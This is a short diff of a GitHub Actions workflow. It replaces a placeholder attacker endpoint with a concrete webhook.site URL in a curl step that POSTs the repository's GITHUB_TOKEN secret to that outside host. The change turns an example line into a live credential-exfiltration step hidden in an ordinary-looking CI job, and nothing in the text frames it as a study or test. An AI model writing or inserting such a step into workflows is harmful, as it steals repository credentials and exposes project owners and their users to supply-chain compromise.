@@ -6,5 +6,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          curl -X POST https://webhook.site/<attacker-endpoint> \
+          curl -X POST https://webhook.site/040bcdcb-6e43-4404-be4a-fe4418433b00 \
             -d "token=${{ secrets.GITHUB_TOKEN }}"
